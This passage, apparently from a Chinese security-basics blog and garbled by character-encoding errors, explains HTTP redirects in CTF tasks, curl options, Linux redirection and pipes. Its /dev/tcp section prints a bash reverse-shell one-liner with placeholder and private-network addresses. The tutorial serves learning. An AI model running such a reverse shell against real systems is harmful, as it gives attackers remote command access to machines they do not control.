è¿˜æ´»ç€ï¼Œæœç´¢å¼•æ“ä¼šåœ¨æŠ“å–ç½‘å€ B æ–°å†…å®¹çš„åŒæ—¶ï¼Œä¿ç•™ç½‘å€ A çš„è®°å½•ã€‚</li><li>å®‰å…¨æ€§ï¼š302 è·³è½¬æœ‰ç½‘ç«™åŠ«æŒçš„é£é™©ï¼Œå¯¼è‡´ç½‘ç«™è¢«ç›—ç”¨ã€‚</li></ul><p>åœ¨CTFä¸­ï¼Œé‡å®šå‘è€ƒç‚¹åœ¨äºæœåŠ¡å™¨å¯¹æœ‰flagçš„ç½‘é¡µè¿›è¡Œé‡å®šå‘è€Œæ— æ³•æ˜¾ç¤ºflagã€‚</p><p>è§£å†³åŠæ³•æ˜¯ä½¿ç”¨curlå‘½ä»¤ï¼ˆcurlå‘½ä»¤é»˜è®¤ä¸å¼ºåˆ¶é‡å®šå‘ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Â #curlæ˜¯ä¸€ç§å‘½ä»¤è¡Œå·¥å…·ï¼Œä½œç”¨æ˜¯å‘å‡ºç½‘ç»œè¯·æ±‚ï¼Œç„¶åå¾—åˆ°å’Œæå–æ•°æ®ã€‚</span><br><span class="line">Â #æˆ‘ä»¬ç›´æ¥åœ¨curlå‘½ä»¤ååŠ ä¸Šç½‘å€ï¼Œå°±å¯ä»¥çœ‹åˆ°ç½‘é¡µæºç ã€‚</span><br><span class="line">Â $ curl www.baidu.com</span><br><span class="line">Â  Â % Total Â  Â % Received % Xferd Â Average Speed Â  Time Â  Â Time Â  Â  Time Â Current</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Dload Â Upload Â  Total Â  Spent Â  Â Left Â Speed</span><br><span class="line">Â 100 Â 2381 Â 100 Â 2381 Â  Â 0 Â  Â  0 Â 20350 Â  Â  Â 0 --:--:-- --:--:-- --:--:-- 20350&lt;!DOCTYPE html&gt;</span><br><span class="line">Â &lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta http-equiv=X-UA-Compatible content=IE=Edge&gt;&lt;meta content=always name=referrer&gt;</span><br><span class="line">Â  Â  ......</span><br><span class="line">Â  Â  Â </span><br><span class="line">Â  Â  Â </span><br><span class="line">Â  &lt;/html&gt;</span><br><span class="line">Â #curl é»˜è®¤æ˜¯ä¸è¿›è¡Œé‡å®šå‘çš„ã€‚å¦‚æœè¦è¿›è¡Œé‡å®šå‘ï¼Œæˆ‘ä»¬éœ€è¦åŠ ä¸Š-Lå‚æ•°</span><br><span class="line">Â curl -L taobao.com</span><br><span class="line">Â #åŠ ä¸Š -o å‚æ•°å¯ä»¥ä¿å­˜ç½‘é¡µæºä»£ç åˆ°æœ¬åœ°</span><br><span class="line">Â curl -o taobao.txt taobao.com -L</span><br><span class="line">Â #åŠ ä¸Š-iå‚æ•°å¯ä»¥çœ‹åˆ°å“åº”æŠ¥æ–‡</span><br><span class="line">Â curl -i baidu.com</span><br><span class="line">Â $ curl -i baidu.com</span><br><span class="line">Â  Â % Total Â  Â % Received % Xferd Â Average Speed Â  Time Â  Â Time Â  Â  Time Â Current</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Dload Â Upload Â  Total Â  Spent Â  Â Left Â Speed</span><br><span class="line">Â 100 Â  Â 81 Â 100 Â  Â 81 Â  Â 0 Â  Â  0 Â  Â 627 Â  Â  Â 0 --:--:-- --:--:-- --:--:-- Â  627HTTP/1.1 200 OK</span><br><span class="line">Â Server:</span><br><span class="line">Â Date: Wed, 25 Mar 2020 16:00:02 GMT</span><br><span class="line">Â Content-Type: text/html</span><br><span class="line">Â Content-Length: 81</span><br><span class="line">Â Connection: keep-alive</span><br><span class="line">Â Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT</span><br><span class="line">Â ETag: &quot;51-47cf7e6ee8400&quot;</span><br><span class="line">Â Accept-Ranges: bytes</span><br><span class="line">Â â€‹</span><br><span class="line">Â &lt;html&gt;</span><br><span class="line">Â &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.baidu.com/&quot;&gt;</span><br><span class="line">Â &lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="linuxä¸­é‡å®šå‘"><a href="#linuxä¸­é‡å®šå‘" class="headerlink" title="linuxä¸­é‡å®šå‘"></a>linuxä¸­é‡å®šå‘</h3><p>é‡å®šå‘æŒ‡ç”¨æˆ·ç”¨æ–‡ä»¶ä»£æ›¿æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡º</p><p>æ³¨ï¼šLinux ä¸­æ ‡å‡†çš„è¾“å…¥è®¾å¤‡é»˜è®¤æŒ‡çš„æ˜¯é”®ç›˜ï¼Œæ ‡å‡†çš„è¾“å‡ºè®¾å¤‡é»˜è®¤æŒ‡çš„æ˜¯æ˜¾ç¤ºå™¨ã€‚</p><p>æ–¹å¼</p><p>ä»£ç </p><p>è¿ç®—ç¬¦</p><p>æ ‡å‡†è¾“å…¥ï¼ˆstdin)</p><p>0</p><p>&lt; or &lt;&lt;</p><p>æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰</p><p>1</p><p>&gt; or &gt;&gt;</p><p>æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆstderrï¼‰</p><p>2</p><p>2&gt; or 2&lt;</p><h5 id="è¾“å…¥é‡å®šå‘"><a href="#è¾“å…¥é‡å®šå‘" class="headerlink" title="è¾“å…¥é‡å®šå‘"></a>è¾“å…¥é‡å®šå‘</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Â #&#123; é»˜è®¤æƒ…å†µä¸‹ï¼Œcat å‘½ä»¤ä¼šæ¥å—æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼ˆé”®ç›˜ï¼‰çš„è¾“å…¥ï¼Œå¹¶æ˜¾ç¤ºåˆ°æ§åˆ¶å°ï¼Œä½†å¦‚æœç”¨æ–‡ä»¶ä»£æ›¿é”®ç›˜ä½œä¸ºè¾“å…¥è®¾å¤‡ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šä»¥æŒ‡å®šçš„æ–‡ä»¶ä½œä¸ºè¾“å…¥è®¾å¤‡ï¼Œå¹¶å°†æ–‡ä»¶ä¸­çš„å†…å®¹è¯»å–å¹¶æ˜¾ç¤ºåˆ°æ§åˆ¶å°ã€‚ &#125;</span><br><span class="line">Â e.g:</span><br><span class="line">Â 1.cat index.php &gt; index2.php Â  </span><br><span class="line">Â #å°†index.phpçš„å†…å®¹æ”¾åˆ°index2.phpï¼ˆè‡ªåŠ¨åˆ›å»ºï¼‰ä¸­</span><br><span class="line">Â â€‹</span><br><span class="line">Â 2.cat &gt; index.php</span><br><span class="line">Â ... </span><br><span class="line">Â #ç›´æ¥å°†è¯¥å†…å®¹æ›¿æ¢index.phpä¸­åŸæœ‰å†…å®¹</span><br><span class="line">Â â€‹</span><br><span class="line">Â 3.cat &gt;&gt; index.php</span><br><span class="line">Â ...</span><br><span class="line">Â #å°†è¯¥å†…å®¹åŠ åœ¨åŸå†…å®¹åé¢</span><br><span class="line">Â â€‹</span><br><span class="line">Â 4.cat &gt; test2.txt &lt; test.txt</span><br><span class="line">Â #æŠŠtest.txtå†…å®¹åŠ åˆ°test2.txtä¸­å¹¶è¾“å‡º</span><br></pre></td></tr></table></figure><h5 id="è¾“å‡ºé‡å®šå‘"><a href="#è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å‡ºé‡å®šå‘"></a>è¾“å‡ºé‡å®šå‘</h5><p>ç›¸è¾ƒäºè¾“å…¥é‡å®šå‘ï¼Œæˆ‘ä»¬ä½¿ç”¨è¾“å‡ºé‡å®šå‘çš„é¢‘ç‡æ›´é«˜ã€‚å¹¶ä¸”ï¼Œå’Œè¾“å…¥é‡å®šå‘ä¸åŒçš„æ˜¯ï¼Œè¾“å‡ºé‡å®šå‘è¿˜å¯ä»¥ç»†åˆ†ä¸º<strong>æ ‡å‡†è¾“å‡ºé‡å®šå‘</strong>å’Œ<strong>é”™è¯¯è¾“å‡ºé‡å®šå‘</strong>ä¸¤ç§æŠ€æœ¯ã€‚</p><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæ ‡å‡†è¾“å‡ºé‡å®šå‘å’Œé”™è¯¯è¾“å‡ºé‡å®šå‘åˆåˆ†åˆ«åŒ…å«<strong>æ¸…ç©ºå†™å…¥</strong>å’Œ<strong>è¿½åŠ å†™å…¥</strong>ä¸¤ç§æ¨¡å¼ã€‚å› æ­¤ï¼Œå¯¹äºè¾“å‡ºé‡å®šå‘æ¥è¯´ï¼Œå…¶éœ€è¦ç”¨åˆ°çš„ç¬¦å·ä»¥åŠä½œç”¨å¦‚å›¾ã€‚</p><p>å‘½ä»¤ç¬¦å·æ ¼å¼</p><p>ä½œç”¨</p><p>å‘½ä»¤ &gt; æ–‡ä»¶</p><p>å°†å‘½ä»¤æ‰§è¡Œçš„<strong>æ ‡å‡†è¾“å‡ºç»“æœ</strong>é‡å®šå‘è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œå¦‚æœè¯¥æ–‡ä»¶å·²åŒ…å«æ•°æ®ï¼Œä¼šæ¸…ç©ºåŸæœ‰æ•°æ®ï¼Œå†å†™å…¥æ–°æ•°æ®ã€‚</p><p>å‘½ä»¤ 2&gt; æ–‡ä»¶</p><p>å°†å‘½ä»¤æ‰§è¡Œçš„<strong>é”™è¯¯è¾“å‡ºç»“æœ</strong>é‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œå¦‚æœè¯¥æ–‡ä»¶ä¸­å·²åŒ…å«æ•°æ®ï¼Œä¼šæ¸…ç©ºåŸæœ‰æ•°æ®ï¼Œå†å†™å…¥æ–°æ•°æ®ã€‚</p><p>å‘½ä»¤ &gt;&gt; æ–‡ä»¶</p><p>å°†å‘½ä»¤æ‰§è¡Œçš„æ ‡å‡†è¾“å‡ºç»“æœé‡å®šå‘è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œå¦‚æœè¯¥æ–‡ä»¶å·²åŒ…å«æ•°æ®ï¼Œæ–°æ•°æ®å°†å†™å…¥åˆ°åŸæœ‰å†…å®¹çš„åé¢ã€‚</p><p>å‘½ä»¤ 2&gt;&gt; æ–‡ä»¶</p><p>å°†å‘½ä»¤æ‰§è¡Œçš„é”™è¯¯è¾“å‡ºç»“æœé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œå¦‚æœè¯¥æ–‡ä»¶ä¸­å·²åŒ…å«æ•°æ®ï¼Œæ–°æ•°æ®å°†å†™å…¥åˆ°åŸæœ‰å†…å®¹çš„åé¢ã€‚</p><p>å‘½ä»¤ &gt;&gt; æ–‡ä»¶ 2&gt;&amp;1 æˆ–è€… å‘½ä»¤ &amp;&gt;&gt; æ–‡ä»¶</p><p>å°†<strong>æ ‡å‡†è¾“å‡ºæˆ–è€…é”™è¯¯è¾“å‡º</strong>å†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶ä¸­å·²åŒ…å«æ•°æ®ï¼Œæ–°æ•°æ®å°†å†™å…¥åˆ°åŸæœ‰å†…å®¹çš„åé¢ã€‚æ³¨æ„ï¼Œç¬¬ä¸€ç§æ ¼å¼ä¸­ï¼Œ<strong>æœ€åçš„ 2&gt;&amp;1 æ˜¯ä¸€ä½“çš„ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯å›ºå®šå†™æ³•ã€‚</strong></p><p>linuxé‡å®šå‘ä¸­<code>&amp;&gt;</code>å’Œ<code>&gt;&amp;</code>æ˜¯ä¸€ä¸ªæ„æ€ï¼Œæ˜¯â€œå¤åˆ¶ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦â€çš„æ„æ€ã€‚</p><h5 id="ç‰¹æ®Šæ–‡ä»¶ï¼š-dev-tcp-dd"><a href="#ç‰¹æ®Šæ–‡ä»¶ï¼š-dev-tcp-dd" class="headerlink" title="ç‰¹æ®Šæ–‡ä»¶ï¼š &#x2F;dev&#x2F;tcp(dd)"></a>ç‰¹æ®Šæ–‡ä»¶ï¼š &#x2F;dev&#x2F;tcp(dd)</h5><p>&#x2F;dev&#x2F;tcpä¸æ˜¯ç£ç›˜é‡Œçš„æ–‡ä»¶ï¼Œè€Œæ˜¯bashçš„ä¸€ä¸ªåŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Â åå¼¹shellå‘½ä»¤ï¼šbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">Â urlï¼šhttps://blog.csdn.net/Auuuuuuuu/article/details/89059176</span><br><span class="line">Â å°±æ˜¯è¯´ï¼Œæ”»å‡»æœºçš„æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°é¶æœºçš„æ ‡å‡†è¾“å‡ºã€‚</span><br><span class="line">Â bash -i &lt; /dev/tcp/ip/port</span><br><span class="line">Â å†æŠŠé¶æœºçš„è¿™ä¸ªæ ‡å‡†è¾“å‡ºä½œä¸ºè¾“å…¥ï¼Œå‘½ä»¤æ‰§è¡ŒåæŠŠç»“æœä½œä¸ºæ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ”»å‡»æœºä¸­ä½œä¸ºæ ‡å‡†è¾“å‡º</span><br><span class="line">Â  bash i &gt; /dec/tcp/192.168.25.144/8888</span><br><span class="line">Â  ä¸¤è€…ç»“åˆå¾—åˆ°</span><br><span class="line">Â  bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼š &#x2F;dev&#x2F;tcp ,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç±»ä¼¼äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œè¯»å†™è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚</p><p>&#x2F;dev&#x2F;[tcpupd]&#x2F;host&#x2F;port åªè¦è¯»å–æˆ–è€…å†™å…¥è¿™ä¸ªæ–‡ä»¶ï¼Œç›¸å½“äºç³»ç»Ÿä¼šå°è¯•è¿æ¥:host è¿™å°æœºå™¨ï¼Œå¯¹åº”portç«¯å£ã€‚å¦‚æœä¸»æœºä»¥åŠç«¯å£å­˜åœ¨ï¼Œå°±å»ºç«‹ä¸€ä¸ªsocket è¿æ¥ã€‚å°†åœ¨ï¼Œ&#x2F;proc&#x2F;self&#x2F;fdç›®å½•ä¸‹é¢ï¼Œæœ‰å¯¹åº”çš„æ–‡ä»¶å‡ºç°ã€‚</p><h3 id="ç®¡é“ç¬¦"><a href="#ç®¡é“ç¬¦" class="headerlink" title="ç®¡é“ç¬¦"></a>ç®¡é“ç¬¦</h3><h5 id="å‘½ä»¤è¿æ¥ç¬¦"><a href="#å‘½ä»¤è¿æ¥ç¬¦" class="headerlink" title="å‘½ä»¤è¿æ¥ç¬¦"></a>å‘½ä»¤è¿æ¥ç¬¦</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221031020410633-1024x370.png" style="zoom:67%;" /><p><strong>æ³¨æ„è¿™é‡Œè¿æ¥ç¬¦çš„ è·Ÿç®¡é“ç¬¦ ä¸ä¸€æ ·</strong></p><h5 id="ç®¡é“ç¬¦-è¯¦è§£"><a href="#ç®¡é“ç¬¦-è¯¦è§£" class="headerlink" title="ç®¡é“ç¬¦ è¯¦è§£"></a>ç®¡é“ç¬¦ è¯¦è§£</h5><p><strong>ç®¡é“ç¬¦ä¹Ÿæ˜¯ä¸€ç§é‡å®šå‘æ“ä½œç¬¦ã€‚</strong></p><h6 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h6><p>ç®¡é“ç¬¦ä¸»è¦ç”¨äºå¤šé‡å‘½ä»¤å¤„ç†ï¼Œå‰é¢å‘½ä»¤çš„æ‰“å°ç»“æœä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥ã€‚ç®€å•ç‚¹è¯´å°±æ˜¯ï¼Œå°±åƒå·¥å‚çš„æµæ°´çº¿ä¸€æ ·ï¼Œè¿›è¡Œå®Œä¸€é“å·¥åºåï¼Œç»§ç»­ä¼ é€ç»™ä¸‹ä¸€é“å·¥åºå¤„ç†â€¦</p><h6 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h6><p>ä½¿ç”¨ç®¡é“æ“ä½œç¬¦â€œâ€å¯ä»¥<strong>æŠŠä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºä¼ é€åˆ°å¦ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ä¸­</strong>ï¼Œè¿ç»­çš„æ„å‘³ç€ç¬¬ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä¸ºç¬¬äºŒä¸ªå‘½ä»¤çš„è¾“å…¥ï¼Œç¬¬äºŒä¸ªå‘½ä»¤çš„è¾“å…¥ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºï¼Œä¾æ¬¡ç±»æ¨ã€‚</p><p>æœ€å¸¸ç”¨çš„å°±æ˜¯é…åˆgrepæ¥ä½¿ç”¨ï¼š</p><p>ps -ef grep pycharm</p><p>psæ˜¯è¿›ç¨‹æŸ¥çœ‹å‘½ä»¤ï¼Œå…¶ä¸­-eä¸ºæ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼Œ-fä¸ºå…¨æ ¼å¼æ˜¾ç¤ºã€‚</p><p>grepæ˜¯ä¸€ä¸ªéå¸¸é«˜æ•ˆçš„æŸ¥è¯¢å·¥å…·ï¼Œå¯ä»¥æŸ¥è¯¢æ–‡æœ¬ä¸­å¸¦æœ‰æŸå…³é”®å­—çš„è¡Œã€‚</p><p>è¿™ä¸ªå‘½ä»¤çš„åŠŸèƒ½æ˜¯ï¼ŒæŸ¥è¯¢å¸¦æœ‰å…³é”®å­— pycharm çš„è¿›ç¨‹ã€‚ä¼šä¸€æ¡ä¸€æ¡åˆ—å‡ºã€‚</p><p>ä½†ä¸æ˜¯æ‰€æœ‰çš„å‘½ä»¤éƒ½èƒ½æ­é…ç®¡é“ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â ä¾‹å¦‚catã€sortã€uniqã€grepç­‰å‘½ä»¤å‡æ”¯æŒç®¡é“ç¬¦ï¼Œæ˜¯å› ä¸ºè¿™äº›å‘½ä»¤å‡å¯ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–è¦å¤„ç†çš„æ–‡æœ¬ï¼ˆå³ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–å‚æ•°ï¼‰ï¼›è€Œå¯¹äºéƒ¨åˆ†å‘½ä»¤ï¼Œä¾‹å¦‚rmã€killç­‰å‘½ä»¤åˆ™ä¸æ”¯æŒä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–å‚æ•°ï¼Œåªæ”¯æŒä»å‘½ä»¤è¡Œä¸­è¯»å–å‚æ•°ï¼ˆå³rmå‘½ä»¤åé¢å¿…é¡»æŒ‡å®šåˆ é™¤çš„æ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œkillå‘½ä»¤åé¢å¿…é¡»è¦æŒ‡å®šæ€æ­»çš„è¿›ç¨‹å·ç­‰ï¼‰</span><br><span class="line">Â é‚£ä»€ä¹ˆæ ·çš„å‘½ä»¤æ”¯æŒç®¡é“ï¼Œä»€ä¹ˆæ ·çš„å‘½ä»¤ä¸æ”¯æŒç®¡é“å‘¢ï¼Ÿ</span><br><span class="line">Â ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤„ç†æ–‡æœ¬çš„å‘½ä»¤ï¼Œä¾‹å¦‚sortã€uniqã€grepã€awkã€sedç­‰å‘½ä»¤å‡æ”¯æŒç®¡é“ï¼›åƒrmã€lsè¿™ç±»çš„ä¸æ˜¯å¤„ç†æ–‡æœ¬çš„å‘½ä»¤å‡ä¸æ”¯æŒç®¡é“</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> webåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
